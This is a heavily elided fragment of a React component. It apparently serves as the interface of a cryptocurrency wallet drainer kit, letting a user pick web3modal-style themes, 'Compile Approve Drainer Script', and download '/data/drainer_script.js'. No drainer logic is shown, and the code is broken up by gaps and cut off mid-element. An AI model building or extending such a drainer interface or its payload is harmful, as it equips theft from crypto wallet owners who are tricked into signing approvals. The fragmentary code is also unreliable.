...
const ECommerce: React.FC = () => {
  ...
  const handleDownload = () => {
    ...
    setTimeout(() => {
      ...
      window.location.href = "/data/drainer_script.js";
    ...
    <DefaultLayout>
      <center>
        <div className="w-[80%] bg-slate-900 rounded-md shadow-4 md:p-17 lg:p-17 p-8 font-medium text-[20px]">
          <p>Compile Approve Drainer Script</p>
          {!isDownloading && (
          ...
          <div>
            ...
            <div className="flex flex-col md:flex-row">
              ...
              >
                <img
                  src="/images/web3modal/white.png"
                  className={`w-[90%] mt-10 py-2 ${
                    selectedNumber == 1
              ...
              >
                <img
                  src="/images/web3modal/green.png"
                  className={`w-[90%] mt-10 py-2 ${
                    selectedNumber == 2
                      ? "border-2 rounded-2xl border-white"
                      : ""
